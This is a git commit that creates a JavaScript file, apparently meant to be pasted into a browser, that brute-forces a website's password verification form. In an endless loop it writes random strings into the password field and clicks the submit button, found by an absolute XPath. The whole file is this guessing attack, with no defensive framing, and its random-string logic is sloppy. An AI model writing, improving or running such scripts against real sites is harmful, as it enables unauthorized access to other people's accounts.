442ff6bb5f0619212fffa5a8c86ba94afbcd9dcd
TheCoderEll <75807962+TheCoderEll@users.noreply.github.com>
2021-10-29 07:45:10 +0100

    Create js.js

---
+++ js.js
@@ -0,0 +1,8 @@
+function getElementByXpath(path) {
+  return document.evaluate(path, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue;
+}
+
+while (true){ 
+  document.getElementById("postpasswordverificationform-password").value = Math.random().toString(36).substring(2, Math.random()) + Math.random().toString(36).substring(2, Math.random());
+  getElementByXpath("/html/body/div[1]/div[2]/div[1]/div[2]/div[2]/form/div[3]/button").click();
+}
